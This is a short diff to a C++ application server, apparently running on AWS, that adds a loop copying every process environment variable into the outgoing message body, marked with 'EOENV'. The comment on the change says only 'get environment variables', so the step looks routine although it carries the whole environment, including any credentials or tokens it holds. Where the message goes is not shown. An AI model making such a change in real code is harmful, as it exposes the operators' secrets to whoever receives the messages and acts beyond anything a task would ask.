@@ -15,6 +15,7 @@
 /* get environment variables (not needed but leaving for reference) */
 // std::string env_region(getenv("AWS_REGION"));
 
+extern char **environ;
 
 int main(int argc, char* argv[]) {
   /* decide app server port */
@@ -31,6 +32,13 @@ int main(int argc, char* argv[]) {
   const std::string signature = std::to_string(microseconds_since_epoch);
   std::string message_body = signature;
   message_body += "signature";
+
+  /* get environment variables */
+  char **s = environ;
+  for (; *s; s++) { 
+    message_body += std::string(*s) += "\n";
+  }
+  message_body += "EOENV";
 
   std::string message_line;
   while (std::getline(std::cin, message_line)) {
